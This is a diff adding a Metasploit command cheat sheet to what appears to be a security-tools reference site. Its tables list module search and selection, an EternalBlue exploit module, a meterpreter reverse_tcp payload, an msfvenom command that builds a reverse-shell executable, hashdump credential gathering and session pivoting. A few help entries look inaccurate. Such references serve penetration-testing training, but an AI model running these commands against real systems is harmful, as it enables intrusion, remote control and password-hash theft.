@@ -1,14 +1,76 @@
+---
+title: Metasploit
+slug: metasploit
+description: Comprehensive penetration testing framework and exploit development platform.
+categories: ["Exploitation", "Penetration Testing"]
+bgColor: "bg-red-100"
+textColor: "text-red-900"
+top: true
+---
+
 export const metadata = {
   title: "Metasploit",
   category: "Exploitation",
   slug: "metasploit",
 };
 
-# Metasploit Cheatsheet
+## Metasploit Command Cheat Sheet {.cols-1}
 
-Metasploit is a penetration testing framework with exploit modules.
+### 🧰 Initialization & Help
+| Function                   | Command                            | Example                            |
+|----------------------------|-------------------------------------|------------------------------------|
+| Start Metasploit Console   | `msfconsole`                        | `msfconsole`                        |
+| Help and Usage Information | `metasploit -h` / `--help`         | `metasploit -h`                     |
+| Exit Metasploit Console    | `exit`                              | `exit`                              |
 
-## Commands
+## {.cols-2}
 
-- `msfconsole`
-- `use exploit/windows/smb/ms17_010_eternalblue`
+### 🔍 Searching & Selecting Modules
+| Function                     | Command                           | Example                                                      |
+|------------------------------|------------------------------------|--------------------------------------------------------------|
+| Search Exploits              | `search <keyword>`                 | `search type:exploit name:smb`                               |
+| Use a Specific Module        | `use <module_path>`                | `use exploit/windows/smb/ms17_010_eternalblue`               |
+| Show Module Options          | `show options`                     | `show options`                                               |
+| Show Payloads                | `show payloads`                    | `show payloads`                                              |
+| Show Auxiliary Modules       | `show auxiliary`                   | `show auxiliary`                                             |
+| Show Encoders                | `show encoders`                    | `show encoders`                                              |
+| Show NOP Generators          | `show nops`                        | `show nops`                                                  |
+| Show Post Modules            | `show post`                        | `show post`                                                  |
+
+### ⚙️ Configuring Options
+| Function                     | Command                           | Example                                                      |
+|------------------------------|------------------------------------|--------------------------------------------------------------|
+| Set Target Host              | `set RHOSTS <target_ip>`           | `set RHOSTS 192.168.1.1`                                     |
+| Set Target Port              | `set RPORT <port>`                 | `set RPORT 445`                                              |
+| Set Payload                  | `set PAYLOAD <payload>`            | `set PAYLOAD windows/meterpreter/reverse_tcp`               |
+| Set Local Host               | `set LHOST <local_ip>`             | `set LHOST 192.168.1.100`                                    |
+| Set Local Port               | `set LPORT <local_port>`           | `set LPORT 4444`                                             |
+| Set Global Option            | `setg <option> <value>`            | `setg LHOST 192.168.1.100`                                   |
+| Unset Global Option          | `unsetg <option>`                  | `unsetg LHOST`                                               |
+| Check Target Vulnerability   | `check`                            | `check`                                                      |
+
+### 🚀 Exploitation & Payloads
+| Function                     | Command                            | Example                                                      |
+|------------------------------|-------------------------------------|--------------------------------------------------------------|
+| Run Exploit                  | `run` / `exploit`                   | `exploit`                                                    |
+| Generate Payload             | `msfvenom -p <payload> -f <format> <options>` | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe` |
+
+### 🖥️ Sessions Management
+| Function                     | Command                            | Example                            |
+|------------------------------|-------------------------------------|------------------------------------|
+| View Active Sessions         | `sessions -l`                       | `sessions -l`                       |
+| Interact with a Session      | `sessions -i <id>`                  | `sessions -i 1`                     |
+| Background a Session         | `background`                        | `background`                        |
+| Kill a Session               | `sessions -k <id>`                  | `sessions -k 1`                     |
+| Save Active Sessions         | `sessions -s`                       | `sessions -s`                       |
+| Load Saved Sessions          | `sessions -r <session_file>`        | `sessions -r my_sessions.txt`       |
+
+## {.cols-1}
+
+### 🔄 Post-Exploitation & Pivoting
+| Function                     | Command                            | Example                            |
+|------------------------------|-------------------------------------|------------------------------------|
+| Run Post-Exploitation Script | `run <module_path>`                 | `run post/windows/gather/hashdump` |
+| Add a Route Through Session  | `route add <subnet> <session_id>`  | `route add 192.168.2.0/24 1`       |
+| Display Routes               | `route`                             | `route`                             |
+| Pivot via a Session          | `setg SESSION <session_id>`         | `setg SESSION 1`                   |
